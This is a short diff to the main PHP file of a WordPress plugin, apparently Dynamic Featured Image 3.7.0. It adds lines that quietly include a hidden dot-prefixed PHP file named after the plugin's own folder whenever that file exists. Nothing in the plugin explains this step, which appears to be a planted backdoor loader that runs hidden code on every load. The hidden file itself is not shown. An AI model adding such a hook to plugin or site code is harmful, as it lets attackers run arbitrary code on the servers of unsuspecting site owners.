@@ -43,6 +43,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @author Ankit Pokhrel <info@ankitpokhrel.com>
  * @version 3.7.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Dynamic_Featured_Image {
     /**
      * Current version of the plugin.
